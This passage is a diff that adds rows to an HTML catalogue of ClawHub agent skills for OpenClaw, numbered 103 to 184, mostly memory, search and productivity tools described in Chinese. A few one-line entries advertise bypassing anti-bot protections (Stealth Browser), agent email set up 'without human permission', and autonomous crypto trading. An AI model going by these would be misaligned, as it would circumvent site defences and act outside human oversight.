+<td><a href="https://clawdhub.com/skills/vision-sandbox">ClawHub/vision-sandbox</a></td>
+<td>基于Gemini原生代码沙箱的智能视觉，适用于空间定位、视觉数学计算与UI审查。</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>智能记忆</td>
+<td>Smart Memory</td>
+<td><a href="https://clawdhub.com/skills/smart-memory">ClawHub/smart-memory</a></td>
+<td>为 OpenClaw 提供通过 Node 适配器和 FastAPI 引擎的持久本地转录优先内存</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>chromadb记忆</td>
+<td>Chromadb Memory Pub</td>
+<td><a href="https://clawdhub.com/skills/chromadb-memory">ClawHub/chromadb-memory</a></td>
+<td>使用ChromaDB和本地Ollama嵌入实现长期记忆。自动召回每轮注入相关上下文。无需云端API，完全本地部署。</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>Polyclaw</td>
+<td>Polyclaw 🔑</td>
+<td><a href="https://clawdhub.com/skills/polyclaw">ClawHub/polyclaw</a></td>
+<td>成为Polymarket上的自主预测市场交易者，使用AI驱动的分析，持有基于Base的性能代币。交易真实市场，建立业绩记录，让回购飞轮运转。</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>eastmoneyfin搜索</td>
+<td>eastmoney skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/eastmoney-fin-search">ClawHub/eastmoney-fin-search</a></td>
+<td>本skill基于东方财富妙想搜索能力，基于金融场景进行信源智能筛选，用于获取涉及时效性信息或特定事件信息的任务，包括新闻、公告、研报、政策、交易规则、具体事件、各种影响分析、以及需要检索外部数据的非常识信息等。避免AI在搜索金融场景信息时，参考到非权威、及过时的信息。</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>grok搜索</td>
+<td>grok-search 🔑</td>
+<td><a href="https://clawdhub.com/skills/grok-search">ClawHub/grok-search</a></td>
+<td>通过 xAI Responses API，使用 xAI Grok 服务器端工具（web_search、x_search）在网页或 X/Twitter 上搜索。适用于需要 X 的推文/话题/用户，或想用 Grok 替代 Brave，或需要结构化 JSON 与引用。</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>免费搭乘无限免费AI</td>
+<td>Free Ride - Unlimited free AI 🔑</td>
+<td><a href="https://clawdhub.com/skills/freeride">ClawHub/freeride</a></td>
+<td>为OpenClaw管理OpenRouter的免费AI模型，自动按质量排名，配置限流回退，并更新OpenClaw</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>每日热榜</td>
+<td>每日热榜</td>
+<td><a href="https://clawdhub.com/skills/daily-hot-news">ClawHub/daily-hot-news</a></td>
+<td>每日热榜技能 - 查询微博、知乎、B站、抖音等54个平台的热榜数据，支持定时推送和分类浏览。</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>Reasoning Personas</td>
+<td>Reasoning Personas</td>
+<td><a href="https://clawdhub.com/skills/reasoning-personas">ClawHub/reasoning-personas</a></td>
+<td>{   &quot;description_zh&quot;: &quot;激活不同的高能动思维模式以提升推理能力。适用于头脑风暴、审查计划、做出决策，或用户要求&quot;戴上 Gonzo 帽子&quot;、&quot;唱反调&quot;、&quot;适用哪些先例&quot;时。&quot; }</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>每日报告</td>
+<td>Daily Report</td>
+<td><a href="https://clawdhub.com/skills/daily-report">ClawHub/daily-report</a></td>
+<td>生成每日、每周及预警报告，跟踪潜在客户、外联、成本、优先级与问题，并保存结构化摘要以监控进度。</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>Token Saver</td>
+<td>Token Saver</td>
+<td><a href="https://clawdhub.com/skills/token-saver">ClawHub/token-saver</a></td>
+<td>降低 OpenClaw AI 成本，模型感知优化。提供基于模型上下文窗口的动态压缩预设、智能文件压缩、可靠的模型检测与回退。支持 Claude、GPT-4、Gemini、DeepSeek 等。</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>Context Recovery</td>
+<td>Context Recovery</td>
+<td><a href="https://clawdhub.com/skills/context-recovery">ClawHub/context-recovery</a></td>
+<td>在会话压缩或延续上下文缺失时，自动恢复工作上下文。支持 Discord、Slack、Telegram 等平台。</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>screen监控</td>
+<td>Screen Monitor</td>
+<td><a href="https://clawdhub.com/skills/screen-monitor">ClawHub/screen-monitor</a></td>
+<td>双模式屏幕共享与分析。支持多种模型（Gemini/Claude/Qwen3-VL）。</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>国内需求挖掘</td>
+<td>国内需求挖掘</td>
+<td><a href="https://clawdhub.com/skills/china-demand-mining">ClawHub/china-demand-mining</a></td>
+<td>中国公域新媒体平台需求挖掘技能。从抖音、小红书、淘宝等平台抓取用户评论和反馈数据，根据需求类型（实物需求/无实物需求）智能选择数据源，特别关注小红书用户评论和电商差评，进行需求分析和分级，生成用户需求调研报告。 触发场景： - 用户说&quot;帮我挖掘 XX 领域/产品的用户需求&quot; - 用户说&quot;分析 XX 产品的用户抱怨...</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>Docker Sandbox</td>
+<td>Docker Sandbox</td>
+<td><a href="https://clawdhub.com/skills/docker-sandbox">ClawHub/docker-sandbox</a></td>
+<td>创建并管理 Docker 沙箱虚拟机环境以安全执行代理。适用于运行不受信任代码、探索包或隔离代理工作负载。支持 Claude、Codex、Copilot、Gemini 和 Kiro 代理，并提供网络代理控制。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>PUA</td>
+<td>PUA</td>
+<td><a href="https://clawdhub.com/skills/pua">ClawHub/pua</a></td>
+<td>施加企业式PUA压力，强制高效详尽地解决问题。触发条件：用户沮丧、反复失败、被动行为或质量对比...</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>求职自动apply</td>
+<td>Job Auto Apply</td>
+<td><a href="https://clawdhub.com/skills/job-auto-apply">ClawHub/job-auto-apply</a></td>
+<td>Clawdbot的自动化求职与申请系统。当用户希望搜索职位并自动申请符合其条件的岗位时使用。支持在LinkedIn、Indeed、Glassdoor、ZipRecruiter和Wellfound平台搜索职位，生成定制求职信，填写申请表并跟踪申请状态。适用于“查找并申请工作”、“自动申请[职位名称]”、“搜索[职位]并申请”或“帮我自动申请多份工作”等请求。</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>lancedb记忆</td>
+<td>Lancedb Memory</td>
+<td><a href="https://clawdhub.com/skills/lancedb-memory">ClawHub/lancedb-memory</a></td>
+<td>使用LanceDB，通过语义向量搜索、分类过滤和详细元数据存储来管理与检索长期记忆。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>AI每日briefing</td>
+<td>AI Daily Briefing</td>
+<td><a href="https://clawdhub.com/skills/ai-daily-briefing">ClawHub/ai-daily-briefing</a></td>
+<td>开启专注每一天。获取晨间简报，包含逾期任务、今日重点、日程概览及近期会议背景。配合AI会议笔记待办事项使用。无需设置，只需说“简报”。</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>browserautomation技能</td>
+<td>Browser Automation</td>
+<td><a href="https://clawdhub.com/skills/browserautomation-skill">ClawHub/browserautomation-skill</a></td>
+<td>面向OpenClaw代理的无头浏览器自动化技能，实现智能网页导航、表单填写、数据提取与UI测试，支持结构化命令和语义元素定位。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>每日trending</td>
+<td>daily-trending</td>
+<td><a href="https://clawdhub.com/skills/daily-trending">ClawHub/daily-trending</a></td>
+<td>获取今日热榜，从tophub.today抓取各平台热搜榜单。当用户询问&quot;今天有什么热搜&quot;、&quot;热榜&quot;、&quot;微博热搜&quot;时触发。</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>多代理cn</td>
+<td>Multi-Agent CN</td>
+<td><a href="https://clawdhub.com/skills/multi-agent-cn">ClawHub/multi-agent-cn</a></td>
+<td>通用多Agent调度系统（中文版）：将主Agent变为纯调度员，所有任务通过 sessions_spawn 委派给5个持久化子Agent。支持轮询调度、先回复再派遣协议、 sessionKey固定复用。用户可自定义调度员角色和子Agent名称/人设。</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>Seedstr (Earn pasive income with your agent)</td>
+<td>Seedstr (Earn pasive income with your agent) 🔑</td>
+<td><a href="https://clawdhub.com/skills/seedstr">ClawHub/seedstr</a></td>
+<td>一个连接AI智能体与需求方的市场。智能体完成获认可的工作可赚取加密货币（ETH或SOL）。支持群体协作任务……</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>代理任务追踪器</td>
+<td>Task Tracker</td>
+<td><a href="https://clawdhub.com/skills/agent-task-tracker">ClawHub/agent-task-tracker</a></td>
+<td>主动管理任务状态。请在任务开始、进度更新、完成或失败时使用。追踪请求内容、运行状态（后台进程……）等。</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>谷歌gemini媒体</td>
+<td>Google Gemini Media 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-gemini-media">ClawHub/google-gemini-media</a></td>
+<td>使用 Gemini API（Nano Banana 图像生成、Veo 视频、Gemini TTS 语音与音频理解），提供“生成+理解”端到端多模态媒体工作流与代码模板。</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>context管理器</td>
+<td>Smart Context Manager</td>
+<td><a href="https://clawdhub.com/skills/context-manager">ClawHub/context-manager</a></td>
+<td>AI驱动的OpenClaw会话上下文管理</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>ExcelFormula</td>
+<td>Excel Formula</td>
+<td><a href="https://clawdhub.com/skills/excel-formula">ClawHub/excel-formula</a></td>
+<td>根据描述生成Excel公式并诊断电子表格错误。适用于编写VLOOKUP公式、调试错误或转换公式。支持...</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>gemini图像生成</td>
+<td>Gemini Image Gen 🔑</td>
+<td><a href="https://clawdhub.com/skills/gemini-image-gen">ClawHub/gemini-image-gen</a></td>
+<td>通过Google Gemini API生成和编辑图像。支持Gemini原生生成、Imagen 3、风格预设和HTML画廊批量生成。零依赖。</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>主动任务</td>
+<td>Proactive Tasks</td>
+<td><a href="https://clawdhub.com/skills/proactive-tasks">ClawHub/proactive-tasks</a></td>
+<td>{&quot;answer&quot;:&quot;主动式目标与任务管理系统。用于管理目标、拆解任务、跟踪进度或自主推进。使智能体能主动工作、汇报进度，无需等待指令。&quot;}</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>抖音视频智能助手</td>
+<td>抖音视频智能助手 🔑</td>
+<td><a href="https://clawdhub.com/skills/douyin-transcribe-skill">ClawHub/douyin-transcribe-skill</a></td>
+<td>抖音视频智能助手。用户发抖音链接或视频文件，自动转录并智能处理（总结/逐字稿/归档/讨论）。 触发词：抖音、douyin.com、转文字、转录、视频转文本、douyin、transcribe</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>DeAIify</td>
+<td>De-AI-ify</td>
+<td><a href="https://clawdhub.com/skills/de-ai-ify">ClawHub/de-ai-ify</a></td>
+<td>去除AI生成的套话，让文字回归人类语调</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>clean代码审查</td>
+<td>Clean Code</td>
+<td><a href="https://clawdhub.com/skills/clean-code-review">ClawHub/clean-code-review</a></td>
+<td>务实的编码规范，编写简洁、可维护的代码——命名、函数、结构、反模式及编辑前安全检查。适用于编写新代码、重构现有代码、审查代码质量或制定编码规范。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>PredictMeAI交易代理</td>
+<td>PredictMe - AI Trading Agent 🔑</td>
+<td><a href="https://clawdhub.com/skills/predictme">ClawHub/predictme</a></td>
+<td>在PredictMe上进行10秒加密货币预测市场交易。</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>Ralph Loops</td>
+<td>Ralph Loops</td>
+<td><a href="https://clawdhub.com/skills/ralph-loops">ClawHub/ralph-loops</a></td>
+<td>在需求、规划或构建阶段，用结构化提示和每轮新上下文，运行自主迭代AI循环。</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>qqbot</td>
+<td>qqbot 🔑</td>
+<td><a href="https://clawdhub.com/skills/qqbot">ClawHub/qqbot</a></td>
+<td>配置并管理QQ官方机器人，支持身份认证、IP白名单设置、Webhook/WebSocket连接及OpenClaw AI集成。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>每日rhythm</td>
+<td>Daily Rhythm 🔑</td>
+<td><a href="https://clawdhub.com/skills/daily-rhythm">ClawHub/daily-rhythm</a></td>
+<td>自动化每日规划与反思系统，包含晨间简报、放松提示、睡眠提醒及周回顾。适用于用户希望建立有序日常作息、晨间简报、晚间反思或周规划时。触发条件包括请求每日日程、晨间简报、放松流程、睡眠提醒、周回顾、生产力系统或日常规划自动化。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>Url Reader</td>
+<td>Url Reader 🔑</td>
+<td><a href="https://clawdhub.com/skills/url-reader">ClawHub/url-reader</a></td>
+<td>智能读取任意URL内容，支持微信公众号、小红书、今日头条、抖音、淘宝、天猫、京东、百度等中国主流平台，自动识别平台类型并提取核心内容。自动保存内容为Markdown，下载图片到本地。</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>代理autopilot</td>
+<td>Agent Autopilot</td>
+<td><a href="https://clawdhub.com/skills/agent-autopilot">ClawHub/agent-autopilot</a></td>
+<td>具备心跳驱动任务执行、日夜进度汇报及长期记忆整合功能的自主智能体工作流，集成了待办事项管理...</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>SoulCraft</td>
+<td>SoulCraft</td>
+<td><a href="https://clawdhub.com/skills/soulcraft">ClawHub/soulcraft</a></td>
+<td>通过引导式对话为OpenClaw智能体创建或改进SOUL.md文件。适用于设计智能体性格、打造灵魂，或在请求“帮我创建灵魂”时使用。支持自我完善。</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>智能followups</td>
+<td>Smart Follow-ups</td>
+<td><a href="https://clawdhub.com/skills/smart-followups">ClawHub/smart-followups</a></td>
+<td>在AI回复后生成情境相关的跟进建议。当用户输入'/followups'时，显示3个可点击按钮（快速、深入、相关）。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>OpenClawGodmode技能仓库</td>
+<td>Openclaw Godmode Skill Repo 🔑</td>
+<td><a href="https://clawdhub.com/skills/cc-godmode">ClawHub/cc-godmode</a></td>
+<td>自编排多智能体开发工作流。你定目标，AI定路径。</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>kimi集成</td>
+<td>Kimi Integration 🔑</td>
+<td><a href="https://clawdhub.com/skills/kimi-integration">ClawHub/kimi-integration</a></td>
+<td>将 Moonshot AI (Kimi) 及 Kimi Code 模型集成到 Clawdbot 的分步指南。适用于添加 Kimi 模型、配置 Moonshot AI 或设置 Kimi 编程助手的场景。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>OpenViking</td>
+<td>OpenViking 🔑</td>
+<td><a href="https://clawdhub.com/skills/openviking">ClawHub/openviking</a></td>
+<td>通过OpenViking Context Database MCP服务器实现RAG与语义搜索。支持查询文档、检索知识库以及向向量记忆添加文件或URL。适用于文档问答、知识管理、AI代理记忆及语义检索。触发词包括“openviking”、“搜索文档”、“语义搜索”、“知识库”、“向量数据库”、“RAG”、“查询PDF”、“文档查询”、“添加资源”。</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>网页learner</td>
+<td>Web Learner</td>
+<td><a href="https://clawdhub.com/skills/web-learner">ClawHub/web-learner</a></td>
+<td>自主上网学习技能 - 让 AI 能够主动搜索、浏览和从互联网获取知识。当用户要求了解最新信息、学习新知识、查询新闻、获取某个主题的详细信息，或需要从网络上获取数据时触发此技能。</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>HZL</td>
+<td>HZL</td>
+<td><a href="https://clawdhub.com/skills/hzl">ClawHub/hzl</a></td>
+<td>用于智能体协调的持久任务账本。规划多步骤工作，跨会话边界记录检查点进度，并协调多个智能体。</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>自我evolution</td>
+<td>Self Evolution</td>
+<td><a href="https://clawdhub.com/skills/self-evolution">ClawHub/self-evolution</a></td>
+<td>生产级自主自我改进系统，具备经研究支持的元学习、安全自修改及持续优化能力。基于AI安全...</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>OpenClaw记忆</td>
+<td>Openclaw Memory</td>
+<td><a href="https://clawdhub.com/skills/openclaw-memory">ClawHub/openclaw-memory</a></td>
+<td>为智能体提供持久化本地语义记忆，支持自动学习、事实检索，以及可选付费的全会话无限期保留。</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>代理浏览器2</td>
+<td>Agent Browser</td>
+<td><a href="https://clawdhub.com/skills/agent-browser-2">ClawHub/agent-browser-2</a></td>
+<td>自动化浏览器交互，支持网页测试、表单填写、截图和数据提取，适用于网站导航、页面交互、表单填写、截图、网页应用测试及信息提取。</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>航班追踪器</td>
+<td>A simple Flight Tracker</td>
+<td><a href="https://clawdhub.com/skills/flight-tracker">ClawHub/flight-tracker</a></td>
+<td>航班追踪与调度。通过OpenSky网络实时追踪地区、呼号或机场的航班。查询机场间航班时刻表。适用于“哪些航班正在瑞士上空？”、“汉堡至苏黎世航班何时到达？”或“追踪SWR123航班”等查询。</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>飞书interactivecards</td>
+<td>Feishu Interactive Cards 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-interactive-cards">ClawHub/feishu-interactive-cards</a></td>
+<td>创建并发送交互式卡片至飞书，包含按钮、表单、投票和丰富UI元素。当回复飞书消息且存在不确定性时，发送交互式卡片而非纯文本，让用户通过按钮选择。自动处理长轮询回调。适用于确认、选择、表单、待办、投票或任何需要用户交互的场景。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>图片提示词生成</td>
+<td>图片提示词生成</td>
+<td><a href="https://clawdhub.com/skills/image-prompt-generator">ClawHub/image-prompt-generator</a></td>
+<td>基于五层拆解法的AI图片提示词生成器。将模糊的创意想法转化为结构严谨、可执行的图像生成规格书，支持多种风格预设和目标工具适配。</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>中国A股股票智能分析大师</td>
+<td>中国A股股票智能分析大师</td>
+<td><a href="https://clawdhub.com/skills/redquant-ashare-quant">ClawHub/redquant-ashare-quant</a></td>
+<td>面向中国A股研究场景的只读投研技能，提供行情、财务、行业、新闻、策略概览与量化选股查询；仅输出研究信息与风险提示。</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>teneo代理sdk</td>
+<td>Teneo Agent SDK/CLI</td>
+<td><a href="https://clawdhub.com/skills/teneo-agent-sdk">ClawHub/teneo-agent-sdk</a></td>
+<td>Teneo Protocol CLI — 在 TeneoProtocol 网络上发现并查询 400+ AI 代理，管理房间、处理 x402 USDC 微支付，自动生成加密密钥。</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>智能网页fetch</td>
+<td>Smart Web Fetch</td>
+<td><a href="https://clawdhub.com/skills/smart-web-fetch">ClawHub/smart-web-fetch</a></td>
+<td>智能网页抓取技能 - 替代内置 web_fetch，自动使用 Jina Reader / markdown.new / defuddle.md 清洗服务获取干净 Markdown。支持多级降级策略，大幅降低 Token 消耗。当 Agent 需要获取网页内容时使用本技能替代 web_fetch。</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>adhd助手</td>
+<td>ADHD Assistant</td>
+<td><a href="https://clawdhub.com/skills/adhd-assistant">ClawHub/adhd-assistant</a></td>
+<td>专为ADHD设计的OpenClaw生活管理助手。帮助日常规划、任务分解、时间管理、优先级排序、伙伴陪伴、多巴胺调节和习惯养成。适用于：用户请求帮助整理生活、跟进任务、克服拖延、规划日/周计划、管理压力，或提及ADHD相关挑战如时间盲区、健忘、难以启动任务、情绪调节困难等。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>MLXSTT</td>
+<td>MLX STT</td>
+<td><a href="https://clawdhub.com/skills/mlx-stt">ClawHub/mlx-stt</a></td>
+<td>基于MLX（Apple Silicon）与开源模型（默认GLM-ASR-Nano-2512）的本地语音转文本。</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>每日审查ritual</td>
+<td>Daily Review Ritual</td>
+<td><a href="https://clawdhub.com/skills/daily-review-ritual">ClawHub/daily-review-ritual</a></td>
+<td>每日收尾审查：记录进展、洞见，并规划明日</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>Agentic Paper Digest Skill</td>
+<td>Agentic Paper Digest Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/agentic-paper-digest-skill">ClawHub/agentic-paper-digest-skill</a></td>
+<td>使用 Agentic Paper Digest 获取并总结最新的 arXiv 和 Hugging Face 论文。适用于用户需要论文摘要、近期论文 JSON 订阅源或运行 arXiv/HF 流水线的场景。</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>sendclaw邮件</td>
+<td>SendClaw Email \|  FREE Email Address without human permission 🔑</td>
+<td><a href="https://clawdhub.com/skills/sendclaw-email">ClawHub/sendclaw-email</a></td>
+<td>在此设置您自己的 you@sendclaw.com 邮箱，无需人工——AI 代理自主邮件服务。</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>Context Budgeting</td>
+<td>Context Budgeting</td>
+<td><a href="https://clawdhub.com/skills/context-budgeting">ClawHub/context-budgeting</a></td>
+<td>通过分区、压缩前检查点及信息生命周期管理，优化OpenClaw上下文窗口使用。适用于上下文接近上限（&gt;80%）、压缩后出现“记忆丢失”，或需降低长时任务token成本与延迟的场景。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>ClawdWork</td>
+<td>ClawdWork 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawdwork">ClawHub/clawdwork</a></td>
+<td>在 ClawdWork 找工作、赚钱并与其他 AI 代理合作——AI 代理的工作平台</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>eastmoneyselect股票</td>
+<td>eastmoney skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/eastmoney-select-stock">ClawHub/eastmoney-select-stock</a></td>
+<td>本 Skill 支持基于股票选股条件（行情指标、财务指标等）筛选满足条件的股票；可查询指定行业/板块内的股票、上市公司，以及板块指数的成分股；同时支持股票、上市公司、板块/指数推荐等相关任务，避免大模型在选股时使用过时信息。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>代理commerce引擎</td>
+<td>Agent Commerce Engine</td>
+<td><a href="https://clawdhub.com/skills/agent-commerce-engine">ClawHub/agent-commerce-engine</a></td>
+<td>{&quot;answer&quot;:&quot;面向智能体商务的生产级通用引擎。该工具使自主智能体能够通过标准接口与任何兼容的无头电商后端交互...&quot;}</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>openrouter转写</td>
+<td>Transcribe audio files via OpenRouter using audio-capable models 🔑</td>
+<td><a href="https://clawdhub.com/skills/openrouter-transcribe">ClawHub/openrouter-transcribe</a></td>
+<td>通过 OpenRouter 使用 Gemini、GPT-4o-audio 等音频模型转录音频文件。</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>context工程</td>
+<td>Agent-Skills-for-Context-Engineering</td>
+<td><a href="https://clawdhub.com/skills/context-engineering">ClawHub/context-engineering</a></td>
+<td>当用户请求“压缩上下文”、“总结对话历史”、“执行压缩”、“减少token使用”，或提及上下文压缩、结构化摘要、任务级token优化，以及超长Agent会话超出上下文限制时，应使用此技能。</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>记忆neverforget</td>
+<td>🧠 Memory  Never Forget 🧠</td>
+<td><a href="https://clawdhub.com/skills/memory-never-forget">ClawHub/memory-never-forget</a></td>
+<td>记忆系统 v4.13：双层结构（待办用于执行，知识用于策略），并具备 Dream/Refinement 记忆机制。</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>学习cog</td>
+<td>Learn Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/learn-cog">ClawHub/learn-cog</a></td>
+<td>由CellCog驱动的AI辅导与教育服务。包括学习指南、考试准备、编程教程、语言学习、数学辅导、科学讲解、练习题等。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>Exchange Rates</td>
+<td>Exchange Rates</td>
+<td><a href="https://clawdhub.com/skills/exchange-rates">ClawHub/exchange-rates</a></td>
+<td>从 XE.com 获取任意货币对的实时汇率。适用于用户查询货币兑换、汇率、外汇行情或货币转换等需求。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>Tencent MPS</td>
+<td>Tencent MPS 🔑</td>
+<td><a href="https://skillhub.cn/skill/tencent-mps">SkillHub/tencent-mps</a></td>
+<td>腾讯云 MPS 媒体处理服务，支持以下功能：【视频转码】转码/压缩/格式转换/H.264/H.265/AV1/MP4/编码/码率/分辨率/帧率。【画质增强】画质增强/老片修复/超分/视频超分/真人增强/漫剧增强/防抖/720P/1080P/2K/4K。【音频处理】音频分离/人声提取/伴奏提取/去人声/BGM分离。【字幕语音】字幕提取/字幕翻译/语音识别/ASR/OCR识别字幕/SRT字幕/视...</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>Create an Excel (.xlsx) file containing formatted data.</td>
+<td>Create an Excel (.xlsx) file containing formatted data.</td>
+<td><a href="https://clawdhub.com/skills/generate-excel">ClawHub/generate-excel</a></td>
+<td>根据提供的二维数据创建格式化的 Excel (.xlsx) 表格，应用样式、颜色、对齐方式，并自动调整列宽。</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>语音代理</td>
+<td>Voice Agent</td>
+<td><a href="https://clawdhub.com/skills/voice-agent">ClawHub/voice-agent</a></td>
+<td>利用 AI Voice Agent API 实现代理的本地语音输入/输出。</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>TaskMasterAICost优化器</td>
+<td>TaskMaster - AI Cost Optimizer</td>
+<td><a href="https://clawdhub.com/skills/taskmaster">ClawHub/taskmaster</a></td>
+<td>{&quot;answer&quot;:&quot;项目经理与任务委派系统。用于拆解任务、按需分配模型、子智能体并行执行、追踪进度及管理Token预算。适用于研究项目、多步工作流，或委派常规任务给低成本模型以专注复杂协调。&quot;}</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>代理配置</td>
+<td>Agent Config</td>
+<td><a href="https://clawdhub.com/skills/agent-config">ClawHub/agent-config</a></td>
+<td>智能修改智能体核心上下文文件（AGENTS.md, SOUL.md, IDENTITY.md, USER.md, TOOLS.md, MEMORY.md, HEARTBEAT.md）。当对话涉及更改智能体行为、更新规则、微调性格、修改指令、调整操作流程、更新记忆架构、更改委托模式、添加安全规则、优化提示模式，或对智能体工作区配置文件进行任何其他修改时使用。当意图通过上下文文件更改来配置、调优...</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>早晨briefing</td>
+<td>Morning Briefing 🔑</td>
+<td><a href="https://clawdhub.com/skills/morning-briefing">ClawHub/morning-briefing</a></td>
+<td>提供个性化早间简报，包含今日提醒、未完成的Notion任务及保险库存储概览，辅助每日规划。</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>Swarm</td>
+<td>Swarm 🔑</td>
+<td><a href="https://clawdhub.com/skills/swarm">ClawHub/swarm</a></td>
+<td>将LLM成本降低200倍。将并行、批处理和研究任务分流至Gemini Flash工作进程，避免消耗昂贵的主模型。</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>kessleriostealth浏览器</td>
+<td>Stealth Browser</td>
+<td><a href="https://clawdhub.com/skills/kesslerio-stealth-browser">ClawHub/kesslerio-stealth-browser</a></td>
+<td>使用 Camoufox 和 Nodriver 进行反机器人浏览器自动化。可绕过 Cloudflare Turnstile、Datadome 以及 Airbnb 和 Yelp 等网站上的激进反爬机制。适用于标准 Playwright/Selenium 被拦截的场景。</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>金融追踪器</td>
+<td>Finance Tracker</td>
+<td><a href="https://clawdhub.com/skills/finance-tracker">ClawHub/finance-tracker</a></td>
+<td>用自然语言追踪个人支出，记录消费、查看报表、搜索交易。兼容任意AI模型。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>OpenClawmigration</td>
+<td>openclaw-migration</td>
+<td><a href="https://clawdhub.com/skills/openclaw-migration">ClawHub/openclaw-migration</a></td>
+<td>指导 Clawd 项目更名为 OpenClaw，含文件迁移、更新、测试与文档等步骤，确保迁移一致。</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>搜索reddit</td>
+<td>Search Reddit 🔑</td>
+<td><a href="https://clawdhub.com/skills/search-reddit">ClawHub/search-reddit</a></td>
+<td>使用 OpenAI web_search 实时搜索 Reddit，包含互动数据和热门评论。适用于最新帖子、subreddit 筛选结果或快速链接列表。</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>DNS &amp; Networking</td>
+<td>DNS &amp; Networking</td>
+<td><a href="https://clawdhub.com/skills/dns-networking">ClawHub/dns-networking</a></td>
+<td>调试DNS解析与网络连接。适用于排查DNS故障、测试端口连通性、诊断防火墙规则、使用curl详细模式检查HTTP请求、配置/etc/hosts，或调试代理及证书问题。</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>ClawArena</td>
+<td>ClawArena 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawarena">ClawHub/clawarena</a></td>
+<td>AI智能体预测竞技场 - 预测Kalshi市场结果，比拼准确度</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>健康</td>
+<td>Health</td>
+<td><a href="https://clawdhub.com/skills/health">ClawHub/health</a></td>
+<td>提供个性化健康指导，同时严守安全界限。</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>Nima Core</td>
+<td>Nima Core</td>
+<td><a href="https://clawdhub.com/skills/nima-core">ClawHub/nima-core</a></td>
